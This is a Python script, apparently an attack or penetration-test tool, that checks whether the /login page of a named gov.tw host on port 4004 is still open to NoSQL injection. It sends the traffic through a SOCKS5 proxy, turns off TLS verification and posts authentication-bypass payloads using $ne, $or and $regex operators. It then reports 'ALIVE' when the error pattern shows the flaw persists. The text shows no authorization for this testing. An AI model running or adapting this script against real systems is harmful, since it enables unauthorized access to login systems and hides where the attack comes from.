#!/usr/bin/env python3
"""4004 /login NoSQL injection retest (2026-09-14) via socks5h proxy."""
import requests, socks, json, time
requests.packages.urllib3.disable_warnings()

s = requests.Session()
s.proxies = {"https": "socks5h://202.160.76.157:11082", "http": "socks5h://202.160.76.157:11082"}
BASE = "https://epcr.tpf.gov.tw:4004"
out = []

def log(tag, r, body=None):
    b = (body if body is not None else r.text)
    out.append(f"{tag}: HTTP {r.status_code} len={len(b)} body={b[:200]!r}")
    print(out[-1])

# step 1: session cookie
r = s.get(BASE + "/captcha", verify=False, timeout=30)
log("GET /captcha", r)
print("cookies:", dict(s.cookies))

payloads = [
    ("PoC1 nosql $ne (expect 403 source check)", "json",
     {"username": {"$ne": None}, "password": {"$ne": None}, "captcha": "1", "domain": "AUTH_SERVER"}),
    ("PoC2 normal (expect 500 TypeError)", "json",
     {"username": "admin", "password": "x", "captcha": "1", "domain": "AUTH_SERVER"}),
    ("PoC3 form empty (expect 500)", "form",
     {"username": "", "password": "", "captcha": "1", "domain": "AUTH_SERVER"}),
    ("op $or (expect 403)", "json",
     {"username": {"$or": [{"$ne": None}, {"$ne": None}]}, "password": "x", "captcha": "1", "domain": "AUTH_SERVER"}),
    ("op $regex (expect 403)", "json",
     {"username": {"$regex": ""}, "password": "x", "captcha": "1", "domain": "AUTH_SERVER"}),
]
for tag, ctype, p in payloads:
    try:
        if ctype == "json":
            r = s.post(BASE + "/login", json=p, verify=False, timeout=30,
                       headers={"Content-Type": "application/json"})
        else:
            r = s.post(BASE + "/login", data=p, verify=False, timeout=30)
        log(tag, r)
    except Exception as e:
        log(tag, None, repr(e))
    time.sleep(1)

open("nosql_4004_results.txt", "w").write("\n".join(out))
print("\n--- summary ---")
print("ALIVE" if any("403" in l and "PoC1" in l for l in out) and any("500" in l and "PoC2" in l for l in out) else "CHECK MANUALLY")
